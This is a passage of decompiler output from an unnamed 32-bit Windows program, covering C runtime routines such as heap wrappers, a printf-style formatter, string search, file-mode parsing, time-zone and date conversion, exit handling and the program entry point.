// 415C84: using guessed type int dword_415C84;

//----- (00404670) --------------------------------------------------------
void __cdecl sub_404670(char *lpMem)
{
  if ( lpMem )
  {
    if ( (unsigned int)(lpMem - 4) > dword_415A24 && (unsigned int)(lpMem - 4) < dword_415A20 )
      sub_4042C0((int)lpMem);
    else
      sub_404E70(lpMem);
  }
}
// 415A20: using guessed type int dword_415A20;
// 415A24: using guessed type int dword_415A24;

//----- (004046B0) --------------------------------------------------------
_BYTE *__cdecl sub_4046B0(_BYTE *a1, _BYTE *a2, int a3)
{
  return &sub_404EE0(a1, a2, a3)[a3];
}

//----- (004046D0) --------------------------------------------------------
int sub_4046D0(int a1, char *a2, ...)
{
  int v2; // ebx
  va_list va; // [esp+10h] [ebp+Ch] BYREF

  va_start(va, a2);
  v2 = sub_404F60((int (__cdecl *)(int, char *, int))sub_4046B0, a1, a2, (int)va);
  if ( v2 >= 0 )
    *(_BYTE *)(a1 + v2) = 0;
  return v2;
}

//----- (00404710) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_404710()
{
  int v1; // [esp-4h] [ebp-4h]

  sub_404730((v1 + 3) & 0xFFFFFFFC);
  __asm { retn }
}
// 404712: positive sp value 8 has been found
// 404720: unbalanced stack, ignored a potential tail call
// 404712: variable 'v1' is possibly undefined

//----- (00404730) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_404730(unsigned int a1@<eax>)
{
  void **i; // ecx
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  for ( i = &retaddr; a1 >= 0x1000; a1 -= 4096 )
    i -= 1024;
  __asm { retn }
}
// 404758: positive sp value 4 has been found
// 40475E: unbalanced stack, ignored a potential tail call

//----- (00404760) --------------------------------------------------------
unsigned int __cdecl sub_404760(unsigned int *a1)
{
  struct _FILETIME v2; // [esp-10h] [ebp-14h] BYREF
  unsigned int v3; // [esp-4h] [ebp-8h]

  GetSystemTimeAsFileTime(&v2);
  v3 = sub_4051E0(10000000i64, *(_QWORD *)&v2 - 116444736000000000i64);
  if ( a1 )
    *a1 = v3;
  return v3;
}

//----- (004047B0) --------------------------------------------------------
int __cdecl sub_4047B0(int a1)
{
  int result; // eax

  dword_4159F0 = 0;
  result = a1;
  dword_4159F4 = a1;
  return result;
}
// 4159F0: using guessed type int dword_4159F0;
// 4159F4: using guessed type int dword_4159F4;

//----- (004047D0) --------------------------------------------------------
_BYTE *__cdecl sub_4047D0(_BYTE *a1, char *a2)
{
  _BYTE *v2; // ebx
  _BYTE *result; // eax
  _BYTE *v4; // edi
  char *v5; // esi

  v2 = a1;
  if ( !*a2 )
    return a1;
LABEL_7:
  result = sub_405250(v2, *a2);
  if ( !result )
    return 0;
  v4 = result;
  v5 = a2;
  while ( *++v5 )
  {
    if ( *++v4 != *v5 )
    {
      v2 = result + 1;
      goto LABEL_7;
    }
  }
  return result;
}

//----- (00404830) --------------------------------------------------------
_DWORD *__cdecl sub_404830(const CHAR *a1, _BYTE *a2)
{
  _WORD *v2; // eax

  v2 = sub_405280();
  return sub_4052E0(a1, a2, v2, -1);
}

//----- (00404850) --------------------------------------------------------
int sub_404850()
{
  int v1; // [esp-Ch] [ebp-10h] BYREF
  unsigned __int8 *v2; // [esp-8h] [ebp-Ch] BYREF
  unsigned __int8 *v3; // [esp-4h] [ebp-8h]

  if ( (void *)dword_415A54 != off_415D2C )
  {
    if ( !*(_BYTE *)off_415D2C )
      off_415D2C = (void *)sub_405540();
    v3 = (unsigned __int8 *)sub_4055B0((char *)off_415D2C, 2, &v1);
    dword_415A58 = sub_405630(v3, &v2, 10);
    if ( v2 - v3 != v1 || dword_415A58 <= -1300 || dword_415A58 >= 1300 )
      dword_415A58 = 0;
    dword_415A58 -= 40 * dword_415A58 / 100;
    dword_415A58 = -dword_415A58;
    dword_415A54 = (int)off_415D2C;
  }
  return -60 * dword_415A58;
}
// 415A54: using guessed type int dword_415A54;
// 415A58: using guessed type int dword_415A58;
// 415D2C: using guessed type void *off_415D2C;

//----- (00404920) --------------------------------------------------------
unsigned int *__cdecl sub_404920(_DWORD *a1)
{
  int v1; // eax

  v1 = sub_404850();
  return sub_405770(0, *a1 + v1, 0xFFFFFFFF);
}

//----- (00404940) --------------------------------------------------------
_BYTE *__cdecl sub_404940(_BYTE *a1, unsigned int a2, char *a3, int a4)
{
  return sub_405910(a1, a2, a3, a4, (int)off_415CDC);
}
// 415CDC: using guessed type char *off_415CDC[17];

//----- (00404970) --------------------------------------------------------
int __cdecl sub_404970(int a1, unsigned __int8 *a2, int a3)
{
  if ( sub_405AC0(a2, 1u, a3, a1) == a3 )
    return a1;
  else
    return 0;
}

//----- (004049A0) --------------------------------------------------------
int sub_4049A0(int a1, char *a2, ...)
{
  va_list va; // [esp+10h] [ebp+Ch] BYREF

  va_start(va, a2);
  return sub_404F60((int (__cdecl *)(int, char *, int))sub_404970, a1, a2, (int)va);
}

//----- (004049D0) --------------------------------------------------------
int sub_4049D0()
{
  unsigned int i; // ebx
  int result; // eax

  for ( i = 0; i < 0x100; ++i )
  {
    result = (int)*(&off_415EA0 + i);
    if ( result )
      result = sub_404A20((char *)*(&off_415EA0 + i));
  }
  return result;
}

//----- (00404A00) --------------------------------------------------------
int sub_404A00()
{
  int result; // eax

  if ( !dword_415A5C )
  {
    dword_415A5C = 1;
    return sub_405BE0((int)sub_4049D0);
  }
  return result;
}
// 415A5C: using guessed type int dword_415A5C;

//----- (00404A20) --------------------------------------------------------
int __cdecl sub_404A20(char *lpMem)
{
  int v1; // esi
  int v2; // edi

  v1 = sub_405C10((int)lpMem);
  if ( (*(_WORD *)lpMem & 0x40) != 0 )
    sub_404670(*((char **)lpMem + 2));
  *((_DWORD *)lpMem + 2) = 0;
  if ( *((int *)lpMem + 1) >= 0 && sub_405CE0(*((_DWORD *)lpMem + 1)) )
    v1 = -1;
  if ( *((_DWORD *)lpMem + 15) )
  {
    if ( sub_405DB0(*((LPCSTR *)lpMem + 15)) )
      v1 = -1;
    sub_404670(*((char **)lpMem + 15));
    *((_DWORD *)lpMem + 15) = 0;
  }
  if ( (*(_WORD *)lpMem & 0x80) != 0 )
  {
    v2 = 0;
    while ( *(&off_415EA0 + v2) != lpMem )
    {
      if ( (unsigned int)++v2 >= 0x100 )
        goto LABEL_15;
    }
    *(&off_415EA0 + v2) = 0;
LABEL_15:
    sub_404670(lpMem);
  }
  else
  {
    *(_WORD *)lpMem = 0;
    *((_DWORD *)lpMem + 1) = -1;
    *((_DWORD *)lpMem + 2) = lpMem + 72;
    *((_DWORD *)lpMem + 4) = lpMem + 72;
    *((_DWORD *)lpMem + 5) = lpMem + 72;
    *((_DWORD *)lpMem + 11) = lpMem + 72;
    *((_DWORD *)lpMem + 6) = lpMem + 72;
    *((_DWORD *)lpMem + 12) = lpMem + 72;
    *((_DWORD *)lpMem + 7) = lpMem + 72;
    *((_DWORD *)lpMem + 8) = lpMem + 40;
  }
  return v1;
}

//----- (00404B00) --------------------------------------------------------
_BYTE *__cdecl sub_404B00(_BYTE *a1)
{
  _BYTE *i; // ecx

  for ( i = a1; *i; ++i )
    ;
  return (_BYTE *)(i - a1);
}

//----- (00404B20) --------------------------------------------------------
BOOL __stdcall HandlerRoutine(DWORD CtrlType)
{
  void (__cdecl *v1)(int); // eax
  void (__cdecl *v2)(int); // ebx

  v1 = (void (__cdecl *)(int))sub_404B60(2, 1);
  v2 = v1;
  if ( v1 == (void (__cdecl *)(int))-1 || !v1 )
    return 0;
  if ( v1 != (void (__cdecl *)(int))1 )
  {
    sub_404B60(2, 0);
    v2(2);
  }
  return 1;
}
// 404B60: using guessed type _DWORD __cdecl sub_404B60(_DWORD, _DWORD);

//----- (00404B60) --------------------------------------------------------
int __cdecl sub_404B60(int a1, int a2)
{
  int v3; // edi

  if ( a1 <= 0 || a1 >= 44 || a2 == -1 )
    return -1;
  if ( a1 == 2 && !dword_415A68 )
  {
    if ( !SetConsoleCtrlHandler(HandlerRoutine, 1) )
      return -1;
    dword_415A68 = 1;
  }
  v3 = dword_415BD4[a1];
  dword_415BD4[a1] = a2;
  return v3;
}
// 415A68: using guessed type int dword_415A68;
// 415BD4: using guessed type _DWORD[44];

//----- (00404BD0) --------------------------------------------------------
void __cdecl __noreturn sub_404BD0(UINT uExitCode)
{
  int v1; // eax

  while ( (unsigned int)dword_415BAC < 0x50 )
  {
    v1 = dword_415BAC++;
    ((void (*)(void))funcs_404BE0[v1])();
  }
  while ( dword_415BB0 )
    ((void (*)(void))funcs_404BE0[--dword_415BB0])();
  sub_405DC0(uExitCode);
}
// 415A6C: using guessed type int funcs_404BE0[80];
// 415BAC: using guessed type int dword_415BAC;
// 415BB0: using guessed type int dword_415BB0;

//----- (00404C20) --------------------------------------------------------
void __noreturn start()
{
  void (**i)(void); // esi
  LPSTR v1; // eax
  int wShowWindow; // esi
  int v3; // ebx
  void (**j)(void); // edi
  HMODULE ModuleHandleA; // [esp+Ch] [ebp-60h]
  struct _STARTUPINFOA StartupInfo; // [esp+10h] [ebp-5Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+54h] [ebp-18h]

  dwSize = sub_408DD0(0x2000000);
  if ( !sub_404DF0() )
    sub_405DC0(1u);
  ms_exc.registration.TryLevel = 0;
  sub_405FF0();
  sub_406050();
  sub_406490();
  sub_406530();
  for ( i = dword_412504; i < dword_412504; ++i )
    (*i)();
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  ModuleHandleA = GetModuleHandleA(0);
  v1 = sub_4065F0();
  if ( (StartupInfo.dwFlags & 1) != 0 )
    wShowWindow = StartupInfo.wShowWindow;
  else
    wShowWindow = 10;
  v3 = sub_401B90((int)ModuleHandleA, 0, (int)v1, wShowWindow);
  for ( j = dword_412504; j < dword_412504; ++j )
    (*j)();
  sub_404BD0(v3);
}
// 404C20: using guessed type void __noreturn start();
// 412504: using guessed type void (*dword_412504[63])(void);

//----- (00404D40) --------------------------------------------------------
char *__cdecl sub_404D40(SIZE_T dwSize)
{
  char *result; // eax
  char *v2; // edi
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+Ch] [ebp-1Ch] BYREF

  if ( lpAddress || (result = (char *)VirtualAlloc(0, ::dwSize, 0x2000u, 1u), (lpAddress = result) != 0) )
  {
    result = (char *)VirtualQuery(lpAddress, &Buffer, 0x1Cu);
    if ( result )
    {
      if ( Buffer.State == 4096 )
        v2 = (char *)lpAddress + Buffer.RegionSize;
      else
        v2 = (char *)lpAddress;
      if ( &v2[dwSize] < (char *)lpAddress + ::dwSize )
      {
        result = (char *)VirtualAlloc(v2, dwSize, 0x1000u, 4u);
        if ( result )
          return v2;
      }
      else
      {
        return 0;
      }
    }
  }
  return result;
}

//----- (00404DF0) --------------------------------------------------------
BOOL sub_404DF0()
{
  hHeap = HeapCreate(1u, 0x1000u, 0);
  return hHeap != 0;
}

//----- (00404E30) --------------------------------------------------------
LPVOID __cdecl sub_404E30(SIZE_T dwBytes)
{
  return HeapAlloc(hHeap, 1u, dwBytes);
}

//----- (00404E50) --------------------------------------------------------
LPVOID __cdecl sub_404E50(void *a1, SIZE_T a2)
{
  return HeapReAlloc(hHeap, 1u, a1, a2);
}

//----- (00404E70) --------------------------------------------------------
BOOL __cdecl sub_404E70(LPVOID lpMem)
{
  return HeapFree(hHeap, 1u, lpMem);
}

//----- (00404E90) --------------------------------------------------------
SIZE_T __cdecl sub_404E90(LPCVOID lpMem)
{
  SIZE_T v1; // eax

  v1 = HeapSize(hHeap, 1u, lpMem);
  if ( v1 == -1 )
    return 0;
  else
    return v1;
}

//----- (00404EE0) --------------------------------------------------------
_BYTE *__cdecl sub_404EE0(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *v4; // edx

  v4 = a1;
  while ( a3 )
  {
    *v4++ = *a2++;
    --a3;
  }
  return a1;
}

//----- (00404F00) --------------------------------------------------------
int __cdecl sub_404F00(int a1)
{
  if ( *(int *)(a1 - 4) < 0 )
    return 4 * *(_DWORD *)(a1 - 4) - 8;
  else
    return 0;
}

//----- (00404F30) --------------------------------------------------------
int __cdecl sub_404F30(char *lpMem)
{
  if ( (unsigned int)(lpMem - 4) > dword_415A24 && (unsigned int)(lpMem - 4) < dword_415A20 )
    return sub_404F00((int)lpMem);
  else
    return sub_404E90(lpMem);
}
// 415A20: using guessed type int dword_415A20;
// 415A24: using guessed type int dword_415A24;

//----- (00404F60) --------------------------------------------------------
int __cdecl sub_404F60(int (__cdecl *a1)(int, char *, int), int a2, char *a3, int a4)
{
  int v5; // esi
  int v6; // edi
  _BYTE *v8; // esi
  char *v9; // eax
  char v10; // di
  unsigned __int8 *v11; // eax
  char v12[52]; // [esp+Ch] [ebp-84h] BYREF
  int v13; // [esp+40h] [ebp-50h]
  unsigned __int16 v14; // [esp+46h] [ebp-4Ah] BYREF
  int v15[2]; // [esp+48h] [ebp-48h] BYREF
  char v16[8]; // [esp+50h] [ebp-40h] BYREF
  int (__cdecl *v17)(int, char *, int); // [esp+58h] [ebp-38h]
  int v18; // [esp+5Ch] [ebp-34h]
  int v19; // [esp+64h] [ebp-2Ch]
  int v20; // [esp+68h] [ebp-28h]
  int v21; // [esp+6Ch] [ebp-24h]
  int v22; // [esp+70h] [ebp-20h]
  int v23; // [esp+74h] [ebp-1Ch]
  int v24; // [esp+78h] [ebp-18h]
  int v25; // [esp+7Ch] [ebp-14h]
  int v26; // [esp+80h] [ebp-10h]
  int v27; // [esp+84h] [ebp-Ch]
  __int16 v28; // [esp+88h] [ebp-8h]
  char v29; // [esp+8Ah] [ebp-6h]

  v15[0] = 0;
  v15[1] = 0;
  v17 = a1;
  v18 = a2;
  v26 = 0;
  do
  {
    while ( 1 )
    {
      v14 = 0;
      v5 = sub_4066A0(&v14, a3, 0x7FFFFFFF, (int)v15);
      if ( v5 <= 0 )
        v5 = *a3 != 0;
      if ( v14 == 37 )
        v13 = v5 - 1;
      else
        v13 = v5;
      v6 = v13;
      if ( v13 > 0 )
      {
        v18 = v17(v18, a3, v13);
        if ( !v18 )
          return -1;
        v26 += v6;
      }
      a3 += v5;
      if ( v14 == 37 )
        break;
      if ( !v14 )
        return v26;
    }
    v24 = 0;
    v23 = 0;
    v22 = 0;
    v21 = 0;
    v20 = 0;
    v19 = 0;
    v28 = 0;
    while ( 1 )
    {
      v8 = sub_405250(" +-#0", *a3);
      if ( !v8 )
        break;
      v28 |= LOWORD(dword_4118F0[v8 - " +-#0"]);
      ++a3;
    }
    if ( *a3 == 42 )
    {
      a4 += 4;
      v27 = *(_DWORD *)(a4 - 4);
      if ( v27 < 0 )
      {
        v27 = -v27;
        v28 |= 4u;
      }
      ++a3;
    }
    else
    {
      v27 = 0;
      while ( (*((_WORD *)off_416304 + (unsigned __int8)*a3) & 1) != 0 )
      {
        if ( v27 != 0x7FFFFFFF )
          v27 = (unsigned __int8)*a3 + 10 * v27 - 48;
        ++a3;
      }
    }
    if ( *a3 == 46 )
    {
      if ( *++a3 == 42 )
      {
        a4 += 4;
        v25 = *(_DWORD *)(a4 - 4);
        ++a3;
      }
      else
      {
        v25 = 0;
        while ( (*((_WORD *)off_416304 + (unsigned __int8)*a3) & 1) != 0 )
        {
          if ( v25 != 0x7FFFFFFF )
            v25 = (unsigned __int8)*a3 + 10 * v25 - 48;
          ++a3;
        }
      }
    }
    else
    {
      v25 = -1;
    }
    if ( sub_405250("hjltzL", *a3) )
    {
      v9 = a3++;
      v10 = *v9;
    }
    else
    {
      v10 = 0;
    }
    v29 = v10;
    if ( v10 == 104 && *a3 == 104 )
    {
      v29 = 98;
      ++a3;
    }
    else if ( v29 == 108 && *a3 == 108 )
    {
      v29 = 113;
      ++a3;
    }
    else if ( !v29 && *a3 == 73 && a3[1] == 54 && a3[2] == 52 )
    {
      v29 = 113;
      a3 += 3;
    }
    v11 = (unsigned __int8 *)a3++;
  }
  while ( !sub_406990((int)v16, &a4, *v11, (int)v12) && sub_4070F0((int)v16, (int)v12) >= 0 );
  return -1;
}
// 4118F0: using guessed type int dword_4118F0[];
// 416304: using guessed type void *off_416304;

//----- (004051E0) --------------------------------------------------------
unsigned int __stdcall sub_4051E0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  char v7; // cf
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  if ( HIDWORD(a1) )
  {
    v4 = HIDWORD(a1);
    v5 = a1;
    v6 = a2;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = v6 / v5;
    v9 = v8 * (unsigned __int64)(unsigned int)a1;
    if ( __CFADD__(HIDWORD(a1) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a1 * (unsigned __int64)v8) >> 32, v9 > a2) )
      --v8;
    return v8;
  }
  else
  {
    LODWORD(v3) = a2;
    HIDWORD(v3) = HIDWORD(a2) % (unsigned int)a1;
    return v3 / (unsigned int)a1;
  }
}

//----- (00405250) --------------------------------------------------------
_BYTE *__cdecl sub_405250(_BYTE *a1, char a2)
{
  while ( *a1 != a2 )
  {
    if ( !*a1 )
      return 0;
    ++a1;
  }
  return a1;
}

//----- (00405280) --------------------------------------------------------
_WORD *sub_405280()
{
  _WORD *v0; // esi
  int v1; // ebx
  _WORD *v2; // eax

  v0 = 0;
  v1 = 0;
  while ( *(&off_415EA0 + v1) )
  {
    if ( !*(_WORD *)*(&off_415EA0 + v1) )
    {
      v0 = *(&off_415EA0 + v1);
      *v0 = -129;
      return v0;
    }
    if ( (unsigned int)++v1 >= 0x100 )
      return v0;
  }
  v2 = sub_403DC0(0x4Cu);
  v0 = v2;
  if ( v2 )
  {
    *(&off_415EA0 + v1) = v2;
    *v2 = 128;
  }
  return v0;
}

//----- (004052E0) --------------------------------------------------------
_DWORD *__cdecl sub_4052E0(const CHAR *a1, _BYTE *a2, _DWORD *a3, int a4)
{
  __int16 v5; // [esp+Ch] [ebp-Ch]
  __int16 v6; // [esp+10h] [ebp-8h]
  __int16 v7; // [esp+16h] [ebp-2h]

  if ( !a3 )
    return 0;
  v7 = *(_WORD *)a3 & 0x80;
  qmemcpy(a3, &unk_411910, 0x4Cu);
  a3[2] = a3 + 18;
  a3[4] = a3 + 18;
  a3[5] = a3 + 18;
  a3[11] = a3 + 18;
  a3[6] = a3 + 18;
  a3[12] = a3 + 18;
  a3[7] = a3 + 18;
  a3[8] = a3 + 10;
  if ( *a2 == 114 )
  {
    v6 = 1;
  }
  else
  {
    if ( *a2 == 119 )
      v5 = 26;
    else
      v5 = *a2 != 97 ? 0 : 0x16;
    v6 = v5;
  }
  *(_WORD *)a3 = v6 | v7;
  if ( (*(_WORD *)a3 & 3) == 0 )
    goto LABEL_22;
  while ( *++a2 == 98 || *a2 == 43 )
  {
    if ( *a2 == 98 )
    {
      if ( (*(_WORD *)a3 & 0x20) != 0 )
        break;
      *(_WORD *)a3 |= 0x20u;
    }
    else
    {
      if ( (*(_WORD *)a3 & 3) == 3 )
        break;
      *(_WORD *)a3 |= 3u;
    }
  }
  if ( a1 )
  {
    a3[1] = sub_407370(a1, *(_WORD *)a3);
    if ( (int)a3[1] < 0 )
      goto LABEL_22;
  }
  else
  {
    if ( a4 < 0 )
    {
LABEL_22:
      sub_404A20((char *)a3);
      return 0;
    }
    a3[1] = a4;
  }
  sub_404A00();
  return a3;
}

//----- (00405430) --------------------------------------------------------
char *__cdecl sub_405430(char *a1)
{
  unsigned int v2; // kr00_4
  int v3; // esi
  char *v4; // eax
  int v6; // eax
  char *v7; // eax
  char v8; // cl
  char *v9; // eax
  char *v10; // ebx
  char *v11; // eax
  char *v12; // ebx
  int v13; // esi
  char *v14; // eax

  v2 = __readeflags();
  v3 = 1;
  __writeeflags(v2);
  do
  {
    if ( (*((_WORD *)off_416304 + (unsigned __int8)*a1) & 0xC) == 0 )
      return 0;
    byte_415D34[v3] = *a1;
    v4 = a1++;
    byte_415D38[v3++] = *v4;
  }
  while ( v3 <= 3 );
  v6 = (unsigned __int8)*a1;
  if ( v6 == 45 || v6 == 43 )
  {
    v7 = a1++;
    v8 = *v7;
  }
  else
  {
    v8 = 43;
  }
  byte_415D3D = v8;
  if ( (*((_WORD *)off_416304 + (unsigned __int8)*a1) & 1) == 0 )
    return 0;
  v9 = a1;
  v10 = a1 + 1;
  byte_415D3E = *v9;
  if ( (*((_WORD *)off_416304 + (unsigned __int8)*v10) & 1) == 0 )
    return 0;
  v11 = v10;
  v12 = v10 + 1;
  byte_415D3F = *v11;
  if ( (*((_WORD *)off_416304 + (unsigned __int8)*v12) & 0xC) != 0 )
  {
    v13 = 5;
    while ( (*((_WORD *)off_416304 + (unsigned __int8)*v12) & 0xC) != 0 )
    {
      v14 = v12++;
      byte_415D34[v13++] = *v14;
      if ( v13 > 7 )
        goto LABEL_20;
    }
    return 0;
  }
  else
  {
LABEL_20:
    if ( *v12 )
      return 0;
    else
      return byte_415D34;
  }
}
// 415D3D: using guessed type char byte_415D3D;
// 415D3E: using guessed type char byte_415D3E;
// 415D3F: using guessed type char byte_415D3F;
// 416304: using guessed type void *off_416304;

//----- (00405540) --------------------------------------------------------
int sub_405540()
{
  if ( !dword_415D44 )
  {
    dword_415D44 = 1;
    dword_415D30 = sub_4073E0("TIMEZONE");
    if ( !dword_415D30 )
    {
      dword_415D30 = sub_4073E0(byte_411A90);
      if ( dword_415D30 )
        dword_415D30 = (int)sub_405430((char *)dword_415D30);
    }
    if ( !dword_415D30 )
      dword_415D30 = (int)sub_407500();
  }
  return dword_415D30;
}
// 411A90: using guessed type unsigned __int8 byte_411A90[3];
// 415D30: using guessed type int dword_415D30;
// 415D44: using guessed type int dword_415D44;

//----- (004055B0) --------------------------------------------------------
char *__cdecl sub_4055B0(char *a1, int a2, _DWORD *a3)
{
  char *v3; // ebx
  char *v5; // edi
  int v6; // eax
  char v8; // [esp-8h] [ebp-Ch]

  v3 = a1;
  if ( *a1 )
  {
    v3 = a1 + 1;
    v8 = *a1;
  }
  else
  {
    v8 = 0;
  }
  while ( 1 )
  {
    v5 = sub_405250(v3, v8);
    if ( !v5 )
    {
      v6 = -1;
      do
        ++v6;
      while ( v3[v6] );
      v5 = &v3[v6];
    }
    if ( a2 <= 0 )
    {
      *a3 = v5 - v3;
      return v3;
    }
    if ( !*v5 )
      break;
    --a2;
    v3 = v5 + 1;
  }
  *a3 = 0;
  return v5;
}

//----- (00405630) --------------------------------------------------------
unsigned int __cdecl sub_405630(unsigned __int8 *a1, unsigned __int8 **a2, int a3)
{
  unsigned __int8 **v3; // ebx
  unsigned __int8 *i; // esi
  int v5; // eax
  char *v6; // eax
  unsigned int v7; // edi
  char v10; // [esp+10h] [ebp-Ch]
  char v11; // [esp+14h] [ebp-8h] BYREF
  char v12; // [esp+1Bh] [ebp-1h]

  v3 = a2;
  if ( !a2 )
    v3 = (unsigned __int8 **)&v11;
  for ( i = a1; (*((_WORD *)off_416304 + *i) & 0x60) != 0; ++i )
    ;
  v5 = *i;
  if ( v5 == 45 || v5 == 43 )
  {
    v6 = (char *)i++;
    v10 = *v6;
  }
  else
  {
    v10 = 43;
  }
  v12 = v10;
  v7 = sub_407650(i, v3, a3);
  if ( i == *v3 )
    *v3 = a1;
  if ( a1 == *v3 && v7 || v12 == 43 && v7 > 0x7FFFFFFF || v12 == 45 && v7 > 0x80000000 )
  {
    dword_415C84 = 34;
    return (v12 == 45) - 1 + 0x80000000;
  }
  else if ( v12 == 45 )
  {
    return -v7;
  }
  else
  {
    return v7;
  }
}
// 415C84: using guessed type int dword_415C84;
// 416304: using guessed type void *off_416304;

//----- (00405710) --------------------------------------------------------
int __cdecl sub_405710(int a1, int a2)
{
  int v2; // esi
  __int16 *v3; // ecx

  if ( a1 <= 0 )
  {
    if ( a1 > -4 )
      v2 = 0;
    else
      v2 = (4 - a1) / 4 + 1;
  }
  else
  {
    v2 = (a1 - 1) / 4;
  }
  if ( (a1 & 3) == 0 && a1 )
    v3 = (__int16 *)&unk_411A9C;
  else
    v3 = (__int16 *)&unk_411AB4;
  return v2 + v3[a2];
}

//----- (00405770) --------------------------------------------------------
unsigned int *__cdecl sub_405770(unsigned int *a1, unsigned int a2, unsigned int a3)
{
  signed int v3; // esi
  int j; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // eax
  __int16 *v9; // [esp+14h] [ebp-14h]
  int v10; // [esp+18h] [ebp-10h]
  unsigned int i; // [esp+24h] [ebp-4h]
  unsigned int v12; // [esp+24h] [ebp-4h]

  if ( !a1 )
    a1 = (unsigned int *)&unk_415D48;
  a1[8] = a3;
  for ( i = a2; ; i = a2 + 3600 )
  {
    v3 = ((unsigned int)((3257812230u * (unsigned __int64)i + 3257812230u) >> 32) >> 16) + 25567;
    a1[6] = (int)(((unsigned int)((3257812230u * (unsigned __int64)i + 3257812230u) >> 32) >> 16) + 25568) % 7;
    for ( j = v3 / 365; ; --j )
    {
      v10 = 365 * j + sub_405710(j, 0);
      if ( v3 >= v10 )
        break;
    }
    v5 = v3 - v10;
    a1[5] = j;
    a1[7] = v5;
    if ( (j & 3) == 0 && j )
      v9 = (__int16 *)&unk_411A9C;
    else
      v9 = (__int16 *)&unk_411AB4;
    v6 = 12;
    do
      --v6;
    while ( v5 < v9[v6] );
    a1[4] = v6;
    a1[3] = v5 - v9[v6] + 1;
    v12 = i % 0x15180;
    a1[2] = v12 / 0xE10;
    v12 %= 0xE10u;
    a1[1] = v12 / 0x3C;
    *a1 = v12 % 0x3C;
    if ( (a1[8] & 0x80000000) == 0 )
      break;
    v7 = sub_4077E0(a1);
    a1[8] = v7;
    if ( v7 <= 0 )
      break;
  }
  return a1;
}

//----- (00405910) --------------------------------------------------------
_BYTE *__cdecl sub_405910(_BYTE *a1, unsigned int a2, char *a3, int a4, int a5)
{
  char *v5; // ebx
  int v6; // eax
  int v7; // esi
  int v8; // edi
  int v10; // eax
  char *v11; // eax
  unsigned int v12; // eax
  unsigned __int8 v13; // [esp-50h] [ebp-54h]
  unsigned __int8 v14; // [esp-4Ch] [ebp-50h] BYREF
  unsigned __int8 *v15; // [esp-38h] [ebp-3Ch]
  unsigned __int8 v16; // [esp-31h] [ebp-35h]
  int v17; // [esp-30h] [ebp-34h] BYREF
  unsigned __int16 v18; // [esp-2Ah] [ebp-2Eh] BYREF
  _BYTE *v19; // [esp-28h] [ebp-2Ch]
  _DWORD v20[6]; // [esp-24h] [ebp-28h]
  _DWORD v21[2]; // [esp-Ch] [ebp-10h] BYREF
  unsigned int v22; // [esp-4h] [ebp-8h]

  v5 = a3;
  v22 = 0;
  v6 = -1;
  do
    ++v6;
  while ( a3[v6] );
  v7 = v6;
  v19 = a1;
  v21[0] = 0;
  v21[1] = 0;
  while ( v7 || v22 )
  {
    if ( !v7 )
    {
      v5 = (char *)v20[--v22 + 3];
      v7 = v20[v22];
    }
    v8 = sub_4066A0(&v18, v5, v7, (int)v21);
    if ( v8 <= 0 )
      v8 = *v5 != 0;
    v5 += v8;
    v7 -= v8;
    if ( v18 == 37 && v7 )
    {
      v10 = (unsigned __int8)*v5;
      if ( v10 == 69 || v10 == 79 )
      {
        v11 = v5++;
        v13 = *v11;
      }
      else
      {
        v13 = 0;
      }
      v16 = v13;
      v15 = sub_407E10(a4, a5, v13, *v5, &v17, &v14);
      if ( v16 )
        --v7;
      ++v5;
      --v7;
      if ( v17 <= 0 )
      {
        if ( v7 && v22 < 3 )
        {
          v20[v22 + 3] = v5;
          v5 = (char *)v15;
          v12 = v22++;
          v20[v12] = v7;
          v7 = -v17;
        }
        else
        {
          v5 = (char *)v15;
          v7 = -v17;
        }
      }
      else
      {
        if ( a2 < v17 )
          return 0;
        sub_404EE0(a1, v15, v17);
        a1 += v17;
        a2 -= v17;
      }
    }
    else
    {
      if ( a2 < v8 )
        return 0;
      sub_404EE0(a1, &v5[-v8], v8);
      a1 += v8;
      a2 -= v8;
    }
  }
  if ( !a2 )
    return 0;
  *a1 = 0;
  return (_BYTE *)(a1 - v19);
}

//----- (00405AC0) --------------------------------------------------------
unsigned int __cdecl sub_405AC0(unsigned __int8 *a1, unsigned int a2, int a3, int a4)
{
  int v4; // esi
  int v6; // edi
  unsigned int v7; // [esp-14h] [ebp-18h]
  unsigned __int8 *v8; // [esp-10h] [ebp-14h]
  unsigned __int8 *v9; // [esp-8h] [ebp-Ch]

  v4 = a3 * a2;
  if ( !(a3 * a2) )
    return 0;
  if ( !a2 )
    return a3;
  while ( v4 && (*(_DWORD *)(a4 + 16) < *(_DWORD *)(a4 + 24) || sub_408570(a4) >= 0) )
  {
    if ( (*(_WORD *)a4 & 0x400) != 0 )
      v8 = sub_408680(a1, 0xAu, v4);
    else
      v8 = 0;
    v9 = v8;
    if ( v8 )
      v7 = v8 - a1 + 1;
    else
      v7 = v4;
    v6 = v7;
    if ( *(_DWORD *)(a4 + 24) - *(_DWORD *)(a4 + 16) < v7 )
    {
      v9 = 0;
      v6 = *(_DWORD *)(a4 + 24) - *(_DWORD *)(a4 + 16);
    }
    sub_404EE0(*(_BYTE **)(a4 + 16), a1, v6);
    a1 += v6;
    v4 -= v6;
    *(_DWORD *)(a4 + 16) += v6;
    if ( v9 )
    {
      if ( sub_405C10(a4) )
        break;
    }
  }
  if ( (*(_WORD *)a4 & 0x800) != 0 )
    sub_405C10(a4);
  if ( (*(_WORD *)a4 & 0xC00) != 0 )
    *(_DWORD *)(a4 + 24) = *(_DWORD *)(a4 + 16);
  return (a3 * a2 - v4) / a2;
}

//----- (00405BE0) --------------------------------------------------------
int __cdecl sub_405BE0(int a1)
{
  int result; // eax

  if ( dword_415BAC <= (unsigned int)dword_415BB0 )
    sub_4086B0();
